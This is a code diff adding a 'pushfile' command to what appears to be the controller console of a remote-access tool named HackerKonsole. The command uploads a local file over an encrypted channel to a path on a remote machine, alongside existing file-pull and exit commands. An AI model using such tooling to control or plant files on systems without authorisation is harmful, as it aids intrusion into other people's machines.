@@ -57,6 +57,14 @@ namespace HackerKonsole.Controller.Common
                         byte[] fileHunk = _encryptedConnection.ReadLineCrypto().GetBytes(); //Get a big chunk file
                         File.WriteAllBytes(localFilePath, fileHunk);
                         break;
+                    case "pushfile":
+                        Console.WriteLine("You're pushing a file. Follow the wizard:");
+                        string localPushFileLocation = ConsoleExtensions.ReadWriteLine("Path on local machine: ");
+                        string remoteFileSavePath = ConsoleExtensions.ReadWriteLine("Path on remote machine to save file to: ");
+                        _encryptedConnection.WriteLineCrypto(command + " " + remoteFileSavePath); //send a request to push the file to the remote
+                        _encryptedConnection.WriteLineCrypto(File.ReadAllBytes(localPushFileLocation).GetString());
+                        _encryptedConnection.Flush();
+                        break;
                     case "exit":
                         _encryptedConnection.WriteLineCrypto(command);
                         _encryptedConnection.Close();
